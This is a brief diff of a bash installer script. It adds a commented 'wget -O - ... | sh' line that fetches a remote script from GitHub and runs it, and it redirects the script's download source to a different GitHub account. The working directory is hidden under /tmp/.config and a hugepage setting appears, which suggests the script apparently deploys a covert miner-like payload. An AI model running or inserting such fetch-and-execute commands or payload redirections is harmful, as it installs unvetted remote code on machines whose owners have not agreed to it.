@@ -1,8 +1,9 @@
 #!/bin/bash
+# wget -O - https://raw.githubusercontent.com/edrivetokenbsc/qiyywnbc/main/q.sh | sh
 
 mode="${1:-0}"
 work="/tmp/.config"
-src="https://raw.githubusercontent.com/hanrzme/qiyywnbc/main"
+src="https://raw.githubusercontent.com/edrivetokenbsc/qiyywnbc/main"
 hugepage="128"
 
 RandString() {
